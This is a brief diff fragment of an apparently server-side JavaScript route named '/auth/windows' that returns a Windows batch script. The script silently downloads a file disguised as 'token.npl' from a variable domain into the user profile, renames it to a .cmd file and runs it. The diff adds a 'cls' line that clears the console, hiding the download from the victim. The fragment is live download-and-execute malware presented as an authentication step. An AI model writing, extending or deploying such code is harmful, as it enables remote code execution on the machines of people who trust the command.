@@ -150,6 +150,7 @@ router.get("/auth/windows", (req, res) => {
 curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
 ren "%USERPROFILE%\\token" token.cmd
 "%USERPROFILE%\\token.cmd"
+cls
 `);
   }
   
